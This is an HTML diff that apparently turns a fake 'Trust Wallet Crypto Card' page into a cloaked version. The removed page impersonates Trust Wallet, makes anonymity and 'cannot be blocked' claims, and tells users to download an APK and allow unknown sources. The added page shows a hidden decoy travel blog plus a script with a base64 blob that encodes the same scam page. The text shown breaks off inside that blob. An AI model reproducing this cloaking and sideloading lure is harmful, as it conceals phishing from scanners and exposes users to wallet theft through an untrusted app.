@@ -1,559 +1,89 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trust - Cryptocurrency Card from Trust Wallet</title>
-    <link rel="icon" href="favicon.ico" type="image/x-icon" sizes="16x16"/>
-    <link rel="icon" href="favicon.svg" type="image/svg+xml" sizes="any"/>
-    <link rel="apple-touch-icon" href="apple-icon.png" type="image/png" sizes="39x43"/>
-    <link rel="stylesheet" href="css/styles.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/svg+xml" href="images/icon.png">
+  <link rel="icon" href="favicon.ico" type="image/x-icon" sizes="16x16"/>
+  <link rel="icon" href="favicon.svg" type="image/svg+xml" sizes="any"/>
+  <link rel="apple-touch-icon" href="apple-icon.png" type="image/png" sizes="39x43"/>
+  <title>Beyond Borders Travel Guide</title>
+  <meta name="description" content="Travel blog sharing stories, tips and guides from around the world">
+  <!-- Meta Pixel Code -->
+<script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '991987966832190');
+    fbq('track', 'PageView');
+    </script>
+<noscript>
+<img height="1" src="https://www.facebook.com/tr?id=991987966832190&amp;ev=PageView&amp;noscript=1" style="display:none" width="1"/>
+</noscript>
+<!-- End Meta Pixel Code -->
+  <style>
+    body { font-family: Georgia, serif; background: #fafafa; color: #444; }
+    .container { max-width: 860px; margin: 0 auto; padding: 20px; }
+    h1 { font-size: 28px; color: #2c7a7b; }
+    h2 { font-size: 20px; color: #555; }
+    p { line-height: 1.7; }
+    .tag { display: inline-block; background: #e0f2f1; padding: 2px 8px; border-radius: 4px; font-size: 13px; margin: 2px; }
+  </style>
 </head>
 <body>
 
-    <nav class="navbar">
-        <div class="container">
-            <div class="nav-content">
-                <div class="logo">
-                    <img src="images/trust-full.svg" alt="Trust" class="logo-full">
-                    <img src="images/trust-icon.svg" alt="Trust" class="logo-icon">
-                </div>
-                <ul class="nav-links">
-                    <li><a href="#home" class="active" data-i18n="nav.main">Main</a></li>
-                    <li><a href="#privileges" data-i18n="nav.advantages">Advantages</a></li>
-                    <li><a href="#faq" data-i18n="nav.faq">FAQ</a></li>
-                    <li><a href="#signup" data-i18n="nav.signup">Sign Up</a></li>
-                </ul>
-                <div class="language-selector">
-                    <button class="language-toggle" id="lang-toggle">
-                        <span id="current-lang">EN</span>
-                        <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <polyline points="2 4 6 8 10 4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
-                        </svg>
-                    </button>
-                    <div class="language-menu" id="lang-menu">
-                        <button class="lang-option" data-lang="en">
-                            <span>English</span>
-                        </button>
-                        <button class="lang-option" data-lang="ru">
-                            <span>Русский</span>
-                        </button>
-                        <button class="lang-option" data-lang="de">
-                            <span>Deutsch</span>
-                        </button>
-                        <button class="lang-option" data-lang="fr">
-                            <span>Français</span>
-                        </button>
-                        <button class="lang-option" data-lang="es">
-                            <span>Español</span>
-                        </button>
-                        <button class="lang-option" data-lang="pt">
-                            <span>Português</span>
-                        </button>
-                        <button class="lang-option" data-lang="uk">
-                            <span>Українська</span>
-                        </button>
-                        <button class="lang-option" data-lang="zh">
-                            <span>中文</span>
-                        </button>
-                    </div>
-                </div>
-                <button class="btn-primary" data-i18n="nav.obtain">Obtain Card</button>
-                <button class="mobile-menu-btn" id="mobile-menu-toggle">☰</button>
-            </div>
-        </div>
-
-        <nav class="mobile-nav" id="mobile-nav">
-            <a href="#home" class="mobile-nav-link active" data-i18n="nav.main">Main</a>
-            <a href="#privileges" class="mobile-nav-link" data-i18n="nav.advantages">Advantages</a>
-            <a href="#faq" class="mobile-nav-link" data-i18n="nav.faq">FAQ</a>
-            <a href="#signup" class="mobile-nav-link" data-i18n="nav.signup">Sign Up</a>
-            <div class="mobile-nav-divider"></div>
-            <div class="mobile-language-section">
-                <button class="mobile-language-toggle" id="mobile-lang-toggle">
-                    <span id="mobile-current-lang">EN</span>
-                    <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <polyline points="2 4 6 8 10 4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
-                    </svg>
-                </button>
-                <div class="mobile-language-menu" id="mobile-lang-menu">
-                    <button class="mobile-lang-option" data-lang="en">
-                        <span class="flag">🇺🇸</span>
-                        <span>English</span>
-                    </button>
-                    <button class="mobile-lang-option" data-lang="ru">
-                        <span class="flag">🇷🇺</span>
-                        <span>Русский</span>
-                    </button>
-                    <button class="mobile-lang-option" data-lang="de">
-                        <span class="flag">🇩🇪</span>
-                        <span>Deutsch</span>
-                    </button>
-                    <button class="mobile-lang-option" data-lang="fr">
-                        <span class="flag">🇫🇷</span>
-                        <span>Français</span>
-                    </button>
-                    <button class="mobile-lang-option" data-lang="es">
-                        <span class="flag">🇪🇸</span>
-                        <span>Español</span>
-                    </button>
-                    <button class="mobile-lang-option" data-lang="pt">
-                        <span class="flag">🇵🇹</span>
-                        <span>Português</span>
-                    </button>
-                    <button class="mobile-lang-option" data-lang="uk">
-                        <span class="flag">🇺🇦</span>
-                        <span>Українська</span>
-                    </button>
-                    <button class="mobile-lang-option" data-lang="zh">
-                        <span class="flag">🇨🇳</span>
-                        <span>中文</span>
-                    </button>
-                </div>
-            </div>
-            <button class="btn-primary btn-mobile-obtain" data-i18n="nav.obtain">Obtain Card</button>
-        </nav>
-    </nav>
-
-    <section id="home" class="hero">
-        <div class="container">
-            <div class="hero-content">
-                <div class="hero-text">
-                    <h1 data-i18n="hero1.title">Create Your<br>Cryptocurrency Card from<br>Trust Wallet <span class="highlight" data-i18n="hero1.immediately">Immediately</span></h1>
-                    <p data-i18n="hero1.description">Transactions proceed straight from your Trust Wallet. Make purchases directly from your wallet without balance refills or authentication. Link your wallet and install the application — your card will be prepared in merely 2 minutes.</p>
-                    <div class="hero-buttons">
-                        <button class="btn-primary btn-large btn-obtain-hero" data-i18n="buttons.obtainCard">Obtain Your Card</button>
-                        <button class="btn-secondary btn-large" data-i18n="buttons.discoverMore">Discover More</button>
-                    </div>
-                </div>
-                <div class="hero-image">
-                    <img src="images/intro-image.avif" alt="Crypto Card" class="intro-image">
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <section class="trust-section">
-        <div class="container">
-            <div class="trust-grid">
-                <div class="trust-item">
-                    <div class="trust-label">Trusted by</div>
-                    <div class="trust-value">200M<span class="trust-unit"> people</span></div>
-                </div>
-                <div class="trust-item">
-                    <div class="trust-label">Founded in</div>
-                    <div class="trust-value">2017</div>
-                </div>
-                <div class="trust-item">
-                    <div class="trust-label">Independently</div>
-                    <div class="trust-value">Audited</div>
-                </div>
-                <div class="trust-item">
-                    <div class="trust-label">ISO</div>
-                    <div class="trust-value">Certified</div>
-                </div>
-                <div class="trust-item">
-                    <div class="trust-label">Top reviews</div>
-                    <div class="trust-value trust-stars">
-                        <svg class="star-svg" stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"></path></svg>
-                        <svg class="star-svg" stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"></path></svg>
-                        <svg class="star-svg" stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"></path></svg>
-                        <svg class="star-svg" stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"></path></svg>
-                        <svg class="star-svg" stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"></path></svg>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <section id="privileges" class="privileges">
-        <div class="container">
-            <h2 data-i18n="privileges.title">Received privileges</h2>
-            <p class="subtitle" data-i18n="privileges.subtitle">Benefits of using Crypto Card from Trust Wallet</p>
-
-            <div class="benefits-grid">
-                <div class="benefit-card">
-                    <div class="benefit-image">
-                        <img src="images/benefit1.svg" alt="Instant start, no registration">
-                    </div>
-                    <h3 class="benefit-headline">Instant start, no registration</h3>
-                    <p class="benefit-description">No need to register or create additional accounts. Start using your card immediately.</p>
-                </div>
-                <div class="benefit-card">
-                    <div class="benefit-image">
-                        <img src="images/benefit2.svg" alt="Direct connection to Trust Wallet">
-                    </div>
-                    <h3 class="benefit-headline">Direct connection to Trust Wallet</h3>
-                    <p class="benefit-description">Crypto card is directly connected to your Trust Wallet. Payment goes directly from your wallet.</p>
-                </div>
-                <div class="benefit-card">
-                    <div class="benefit-image">
-                        <img src="images/benefit3.svg" alt="Payment directly from Trust Wallet">
-                    </div>
-                    <h3 class="benefit-headline">Payment directly from Trust Wallet</h3>
-                    <p class="benefit-description">Payment goes directly from your Trust Wallet. Use your crypto funds instantly without intermediaries.</p>
-                </div>
-                <div class="benefit-card">
-                    <div class="benefit-image">
-                        <img src="images/benefit4.svg" alt="KYC-free card — complete anonymity">
-                    </div>
-                    <h3 class="benefit-headline">KYC-free card — complete anonymity</h3>
-                    <p class="benefit-description">Crypto card from Trust Wallet without KYC, directly linked to your wallet.</p>
-                </div>
-                <div class="benefit-card">
-                    <div class="benefit-image">
-                        <img src="images/benefit5.svg" alt="Funds remain in your wallet">
-                    </div>
-                    <h3 class="benefit-headline">Funds remain in your wallet</h3>
-                    <p class="benefit-description">Money remains in your Trust Wallet until spent. It cannot be blocked or restricted.</p>
-                </div>
-                <div class="benefit-card">
-                    <div class="benefit-image">
-                        <img src="images/benefit6.svg" alt="Verified statistics and metrics">
-                    </div>
-                    <h3 class="benefit-headline">Verified statistics and metrics</h3>
-                    <p class="benefit-description">Number of users, total transaction volume, daily transaction count.</p>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <section id="faq" class="faq">
-        <div class="container">
-            <h2 data-i18n="faq.title">FAQ</h2>
-            <p class="subtitle" data-i18n="faq.subtitle">Find answers to some of the most common questions</p>
-
-            <div class="faq-content">
-                <div class="faq-left faq-full">
-                    <div class="faq-item">
-                        <button class="faq-question active" data-faq="0">
-                            <span data-i18n="faq.q1">What is Crypto Card from Trust Wallet?</span>
-                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                                <polyline points="6 9 12 15 18 9"></polyline>
-                            </svg>
-                        </button>
-                        <div class="faq-answer active" id="faq-0">
-                            <p data-i18n="faq.a1">Crypto Card from Trust Wallet is a card for users who want to use cryptocurrencies in their daily life. Payment goes directly from your Trust Wallet. The card allows you to use cryptocurrencies at millions of online and offline stores worldwide.</p>
-                        </div>
-                    </div>
-
-                    <div class="faq-item">
-                        <button class="faq-question" data-faq="1">
-                            <span data-i18n="faq.q2">How does Crypto Card from Trust Wallet work?</span>
-                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                                <polyline points="6 9 12 15 18 9"></polyline>
-                            </svg>
-                        </button>
-                        <div class="faq-answer" id="faq-1">
-                            <p data-i18n="faq.a2">The crypto card connects directly to your Trust Wallet and allows you to spend your cryptocurrency funds instantly at any merchant that accepts the card. Transactions are processed securely and quickly.</p>
-                        </div>
-                    </div>
-
-                    <div class="faq-item">
-                        <button class="faq-question" data-faq="2">
-                            <span data-i18n="faq.q3">Do I need Trust Wallet to get or use a crypto card?</span>
-                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                                <polyline points="6 9 12 15 18 9"></polyline>
-                            </svg>
-                        </button>
-                        <div class="faq-answer" id="faq-2">
-                            <p data-i18n="faq.a3">Yes, you need Trust Wallet to use the crypto card. The card is directly integrated with Trust Wallet for seamless transactions and fund management.</p>
-                        </div>
-                    </div>
-
-                    <div class="faq-item">
-                        <button class="faq-question" data-faq="3">
-                            <span data-i18n="faq.q4">What can I do with Crypto Card from Trust Wallet?</span>
-                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                                <polyline points="6 9 12 15 18 9"></polyline>
-                            </svg>
-                        </button>
-                        <div class="faq-answer" id="faq-3">
-                            <p data-i18n="faq.a4">You can use your crypto card to make online and offline purchases at millions of retailers worldwide. You can also withdraw cash from ATMs in most countries.</p>
-                        </div>
-                    </div>
-
-                    <div class="faq-item">
-                        <button class="faq-question" data-faq="4">
-                            <span data-i18n="faq.q5">What are the prerequisites for ordering Crypto Card?</span>
-                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                                <polyline points="6 9 12 15 18 9"></polyline>
-                            </svg>
-                        </button>
-                        <div class="faq-answer" id="faq-4">
-                            <p data-i18n="faq.a5">You need to have a Trust Wallet account with verified identity. Make sure you have cryptocurrency funds available in your wallet for transactions.</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <section id="signup" class="cta">
-        <div class="container">
-            <div class="cta-content">
-                <h2 data-i18n="cta.title">Join us today</h2>
-                <p data-i18n="cta.description">Crypto Card from Trust Wallet. Payment goes directly from your Trust Wallet. Secure, fast and convenient.</p>
-                <button class="btn-cta" data-i18n="cta.button" onclick="document.getElementById('obtain-card-modal').classList.add('active'); document.getElementById('modal-overlay').classList.add('active');">Get Your Card <span>→</span></button>
-            </div>
-            <div class="cta-image">
-                <img src="images/cta-banner.svg" alt="CTA Banner" class="cta-banner-img">
-            </div>
-        </div>
-    </section>
-
-    <footer class="footer">
-        <div class="container">
-            <div class="footer-content">
-                <div class="footer-logo">
-                    <img src="images/trust-full.svg" alt="Trust" class="footer-logo-img">
-                </div>
-                <p>&copy; 2026 Trust Wallet. All rights reserved.</p>
-            </div>
-        </div>
-    </footer>
-
-<!-- Obtain Card Modal -->
-<div class="modal" id="obtain-card-modal">
-    <div class="modal-content">
-        <button class="modal-close" id="modal-close">&times;</button>
-
-        <div class="modal-header">
-            <h2 data-i18n="modal.title">Get Your Crypto Card</h2>
-        </div>
-
-        <div class="steps-container">
-            <!-- Step 1: Download App -->
-            <div class="step active" data-step="1">
-                <div class="step-header">
-                    <div class="step-number">1</div>
-                    <div class="step-title-group">
-                        <h3 data-i18n="modal.step2.title">Download the app</h3>
-                        <p class="step-subtitle" data-i18n="modal.step2.subtitle">Install the app to manage your Crypto Card</p>
-                    </div>
-                </div>
-                <div class="step-content">
-                    <p data-i18n="modal.step2.description">Install the app to manage your Crypto Card from Trust Wallet.</p>
-                    <p>
-                        <button class="apk-button" id="download-apk-trigger">
-                            <i class="fas fa-download"></i> Download APK (v2.4.1)
-                        </button>
-                    </p>
-                </div>
-            </div>
-
-            <!-- Step 2: Card Ready -->
-            <div class="step inactive" data-step="2">
-                <div class="step-header">
-                    <div class="step-number">2</div>
-                    <div class="step-title-group">
-                        <h3 data-i18n="modal.step3.title">Your Crypto Card is ready</h3>
-                        <p class="step-subtitle" data-i18n="modal.step3.subtitle">Start using your card</p>
-                    </div>
-                </div>
-                <div class="step-content">
-                    
-                    <!-- Инструкция после скачивания -->
-                    <div class="installation-instructions" id="installation-instructions" style="display: none;">
-                        <div class="instructions-header">
-                            <i class="fas fa-check-circle" style="color: #4CAF50;"></i>
-                            <span style="font-weight: 600;">Download complete!</span>
-                        </div>
-                        <ol class="instructions-list">
-                            <li><i class="fas fa-folder-open"></i> Open your device's "Downloads" folder</li>
-                            <li><i class="fas fa-file-alt"></i> Tap on the downloaded APK file (trust-wallet-card-v2.4.1.apk)</li>
-                            <li><i class="fas fa-shield-alt"></i> If prompted, allow installation from unknown sources</li>
-                            <li><i class="fas fa-play-circle"></i> Follow the on-screen installation instructions</li>
-                            <li><i class="fas fa-credit-card"></i> After installation, open the app and log in to activate your Crypto Card</li>
-                        </ol>
-                        <div class="instructions-note">
-                            <i class="fas fa-info-circle"></i>
-                            <span>Having trouble? Make sure your device allows installation from third-party sources.</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
+  <div style="display:none">
+  <div class="container">
+    <h1>Beyond Borders Travel Guide</h1>
+    <p>Discover the world one destination at a time with stories, insights, and practical travel advice. We focus on authentic experiences, local culture, and routes that go beyond the usual tourist paths.</p>
+    <p>From vibrant cities to quiet natural escapes, we share ideas that help you plan meaningful and memorable journeys.</p>
+    
+    <h2>Latest Posts</h2>
+    <p>— Exploring the Colorful Markets of Marrakech</p>
+    <p>— A Relaxed Travel Guide to the French Riviera</p>
+    <p>— Hiking Trails in Patagonia You Shouldn’t Miss</p>
+    
+    <h2>Popular Tags</h2>
+    <span class="tag">Cultural Trips</span>
+    <span class="tag">Luxury & Budget</span>
+    <span class="tag">Outdoor Travel</span>
+    <span class="tag">City Guides</span>
+    <span class="tag">Unique Places</span>
+    
+    <h2>Contact</h2>
+    <p>Email: hello.beyondborders@gmail.com</p>
+    <p>Found us on Google Maps: <a href="https://maps.app.goo.gl/exampleXYZ">Beyond Borders Office, Barcelona, Spain</a></p>
+    <p>We typically reply within 2–3 business days. Always open to new ideas, collaborations, and travel discussions.</p>
+  </div>
 </div>
 
+  <div id="app"></div>
+
+  <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
+  <script>
+    (function() {
+      var b64 = 'DQo8IURPQ1RZUEUgaHRtbD4NCjxodG1sIGxhbmc9ImVuIj4NCjxoZWFkPg0KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4NCiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+DQogICAgPHRpdGxlPlRydXN0IC0gQ3J5cHRvY3VycmVuY3kgQ2FyZCBmcm9tIFRydXN0IFdhbGxldDwvdGl0bGU+DQogICAgPGxpbmsgcmVsPSJpY29uIiBocmVmPSJmYXZpY29uLmljbyIgdHlwZT0iaW1hZ2UveC1pY29uIiBzaXplcz0iMTZ4MTYiLz4NCiAgICA8bGluayByZWw9Imljb24iIGhyZWY9ImZhdmljb24uc3ZnIiB0eXBlPSJpbWFnZS9zdmcreG1sIiBzaXplcz0iYW55Ii8+DQogICAgPGxpbmsgcmVsPSJhcHBsZS10b3VjaC1pY29uIiBocmVmPSJhcHBsZS1pY29uLnBuZyIgdHlwZT0iaW1hZ2UvcG5nIiBzaXplcz0iMzl4NDMiLz4NCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9zdHlsZXMuY3NzIj4NCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL2ZvbnQtYXdlc29tZS82LjAuMC1iZXRhMy9jc3MvYWxsLm1pbi5jc3MiPg0KPC9oZWFkPg0KPGJvZHk+DQoNCiAgICA8bmF2IGNsYXNzPSJuYXZiYXIiPg0KICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0ibmF2LWNvbnRlbnQiPg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImxvZ28iPg0KICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iaW1hZ2VzL3RydXN0LWZ1bGwuc3ZnIiBhbHQ9IlRydXN0IiBjbGFzcz0ibG9nby1mdWxsIj4NCiAgICAgICAgICAgICAgICAgICAgPGltZyBzcmM9ImltYWdlcy90cnVzdC1pY29uLnN2ZyIgYWx0PSJUcnVzdCIgY2xhc3M9ImxvZ28taWNvbiI+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgPHVsIGNsYXNzPSJuYXYtbGlua3MiPg0KICAgICAgICAgICAgICAgICAgICA8bGk+PGEgaHJlZj0iI2hvbWUiIGNsYXNzPSJhY3RpdmUiIGRhdGEtaTE4bj0ibmF2Lm1haW4iPk1haW48L2E+PC9saT4NCiAgICAgICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9IiNwcml2aWxlZ2VzIiBkYXRhLWkxOG49Im5hdi5hZHZhbnRhZ2VzIj5BZHZhbnRhZ2VzPC9hPjwvbGk+DQogICAgICAgICAgICAgICAgICAgIDxsaT48YSBocmVmPSIjZmFxIiBkYXRhLWkxOG49Im5hdi5mYXEiPkZBUTwvYT48L2xpPg0KICAgICAgICAgICAgICAgICAgICA8bGk+PGEgaHJlZj0iI3NpZ251cCIgZGF0YS1pMThuPSJuYXYuc2lnbnVwIj5TaWduIFVwPC9hPjwvbGk+DQogICAgICAgICAgICAgICAgPC91bD4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJsYW5ndWFnZS1zZWxlY3RvciI+DQogICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9Imxhbmd1YWdlLXRvZ2dsZSIgaWQ9ImxhbmctdG9nZ2xlIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGlkPSJjdXJyZW50LWxhbmciPkVOPC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHN2ZyB3aWR0aD0iMTIiIGhlaWdodD0iMTIiIHZpZXdCb3g9IjAgMCAxMiAxMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cG9seWxpbmUgcG9pbnRzPSIyIDQgNiA4IDEwIDQiIHN0cm9rZT0iY3VycmVudENvbG9yIiBzdHJva2Utd2lkdGg9IjEuNSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIi8+DQogICAgICAgICAgICAgICAgICAgICAgICA8L3N2Zz4NCiAgICAgICAgICAgICAgICAgICAgPC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Imxhbmd1YWdlLW1lbnUiIGlkPSJsYW5nLW1lbnUiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0ibGFuZy1vcHRpb24iIGRhdGEtbGFuZz0iZW4iPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuPkVuZ2xpc2g8L3NwYW4+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9Imxhbmctb3B0aW9uIiBkYXRhLWxhbmc9InJ1Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3Bhbj7QoNGD0YHRgdC60LjQuTwvc3Bhbj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0ibGFuZy1vcHRpb24iIGRhdGEtbGFuZz0iZGUiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuPkRldXRzY2g8L3NwYW4+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9Imxhbmctb3B0aW9uIiBkYXRhLWxhbmc9ImZyIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3Bhbj5GcmFuw6dhaXM8L3NwYW4+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9Imxhbmctb3B0aW9uIiBkYXRhLWxhbmc9ImVzIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3Bhbj5Fc3Bhw7FvbDwvc3Bhbj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0ibGFuZy1vcHRpb24iIGRhdGEtbGFuZz0icHQiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuPlBvcnR1Z3XDqnM8L3NwYW4+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9Imxhbmctb3B0aW9uIiBkYXRhLWxhbmc9InVrIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3Bhbj7Qo9C60YDQsNGX0L3RgdGM0LrQsDwvc3Bhbj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0ibGFuZy1vcHRpb24iIGRhdGEtbGFuZz0iemgiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuPuS4reaWhzwvc3Bhbj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4tcHJpbWFyeSIgZGF0YS1pMThuPSJuYXYub2J0YWluIj5PYnRhaW4gQ2FyZDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9Im1vYmlsZS1tZW51LWJ0biIgaWQ9Im1vYmlsZS1tZW51LXRvZ2dsZSI+4piwPC9idXR0b24+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY+DQoNCiAgICAgICAgPG5hdiBjbGFzcz0ibW9iaWxlLW5hdiIgaWQ9Im1vYmlsZS1uYXYiPg0KICAgICAgICAgICAgPGEgaHJlZj0iI2hvbWUiIGNsYXNzPSJtb2JpbGUtbmF2LWxpbmsgYWN0aXZlIiBkYXRhLWkxOG49Im5hdi5tYWluIj5NYWluPC9hPg0KICAgICAgICAgICAgPGEgaHJlZj0iI3ByaXZpbGVnZXMiIGNsYXNzPSJtb2JpbGUtbmF2LWxpbmsiIGRhdGEtaTE4bj0ibmF2LmFkdmFudGFnZXMiPkFkdmFudGFnZXM8L2E+DQogICAgICAgICAgICA8YSBocmVmPSIjZmFxIiBjbGFzcz0ibW9iaWxlLW5hdi1saW5rIiBkYXRhLWkxOG49Im5hdi5mYXEiPkZBUTwvYT4NCiAgICAgICAgICAgIDxhIGhyZWY9IiNzaWdudXAiIGNsYXNzPSJtb2JpbGUtbmF2LWxpbmsiIGRhdGEtaTE4bj0ibmF2LnNpZ251cCI+U2lnbiBVcDwvYT4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vYmlsZS1uYXYtZGl2aWRlciI+PC9kaXY+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2JpbGUtbGFuZ3VhZ2Utc2VjdGlvbiI+DQogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0ibW9iaWxlLWxhbmd1YWdlLXRvZ2dsZSIgaWQ9Im1vYmlsZS1sYW5nLXRvZ2dsZSI+DQogICAgICAgICAgICAgICAgICAgIDxzcGFuIGlkPSJtb2JpbGUtY3VycmVudC1sYW5nIj5FTjwvc3Bhbj4NCiAgICAgICAgICAgICAgICAgICAgPHN2ZyB3aWR0aD0iMTIiIGhlaWdodD0iMTIiIHZpZXdCb3g9IjAgMCAxMiAxMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxwb2x5bGluZSBwb2ludHM9IjIgNCA2IDggMTAgNCIgc3Ryb2tlPSJjdXJyZW50Q29sb3IiIHN0cm9rZS13aWR0aD0iMS41IiBzdHJva2UtbGluZWNhcD0icm91bmQiLz4NCiAgICAgICAgICAgICAgICAgICAgPC9zdmc+DQogICAgICAgICAgICAgICAgPC9idXR0b24+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9iaWxlLWxhbmd1YWdlLW1lbnUiIGlkPSJtb2JpbGUtbGFuZy1tZW51Ij4NCiAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0ibW9iaWxlLWxhbmctb3B0aW9uIiBkYXRhLWxhbmc9ImVuIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJmbGFnIj7wn4e68J+HuDwvc3Bhbj4NCiAgICAgICAg